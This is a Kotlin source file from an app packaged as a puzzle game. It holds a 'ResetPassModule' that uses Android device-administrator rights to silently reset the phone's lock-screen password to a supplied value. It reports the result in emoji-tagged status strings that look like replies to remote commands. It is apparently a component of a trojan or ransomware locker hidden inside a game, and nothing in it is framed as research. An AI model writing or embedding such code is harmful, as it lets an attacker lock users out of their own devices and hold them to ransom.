package com.puzzleblast.game.modules

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.os.Build
import com.puzzleblast.game.services.AdminReceiver

object ResetPassModule {
    @Suppress("DEPRECATION")
    suspend fun reset(ctx: Context, newPass: String): String {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val comp = ComponentName(ctx, AdminReceiver::class.java)
        if (!dpm.isAdminActive(comp)) return "🔑 device admin not active"
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                dpm.resetPasswordWithToken(comp, newPass, null, 0)
            } else {
                dpm.resetPassword(newPass, 0)
            }
            "🔑 password reset"
        } catch (e: Exception) {
            "🔑 failed: ${e.message}"
        }
    }
}
